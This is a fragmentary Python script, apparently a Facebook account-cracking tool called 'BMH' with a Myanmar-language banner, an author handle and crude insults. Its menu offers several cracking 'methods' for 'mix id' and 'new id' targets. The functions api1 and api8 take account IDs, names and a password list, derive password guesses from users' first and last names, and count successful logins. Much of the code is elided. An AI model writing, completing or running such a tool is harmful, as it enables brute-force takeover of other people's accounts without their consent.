...
|/ \___/ |/     \||/     \|
                                     ...
                                     Min A Fay Ngar
\033[1;32m--------------------------------------------------
[~] Owner    : aungzinmin202006/SLK
[~] Facebook : Aung Zin Min
[~] Tool     : BMH
[~] Version  : FREE
[~] Main     : FUCKYOU EVERYONE%...
[~] Import   : Logo Error Lay Par Tar Tee Khan Par 
\033[1;33m----------------------------------------------""")
def linex():
	print('\033[1;32m-----------------------------------------')
def clear():
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				...
				print('  working tool ')
				linex()
				print(' \033[1;32m[1] \033[1;33mMethod  (for mix id)  \033[1;31m (fast) \n\033[1;32m [2] \033[1;34mMethod  (for mix id) \033[1;31m  (best)  \n\033[1;38m [3]\033[1;35m Method  (With Your Father)\033[1;34m   (v.fast) \n\033[1;38m [4]\033[1;32m Method  (for new id)\033[1;31m   (best) \n \033[1;33m[5] \033[1;35mMethod  (for new id) \033[1;31m  (slow) \n \033[1;36m[6] \033[1;39mMethod  (for new id) \n \033[1;38m[7] \033[1;34mMethod  (for new id) \n \033[1;32m[8] \033[1;35mMethod  (for new id) ')
				linex()
				mthd=input(' Choice: ')
				linex()
				plist = []
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;36m [BMH-M1-MYANMAR] %s|\033[1;34mOK:-%s \033[1;35m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;36m [BMH-M8-MYANMAR] %s|\033[1;35mOK:-%s \033[1;34m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
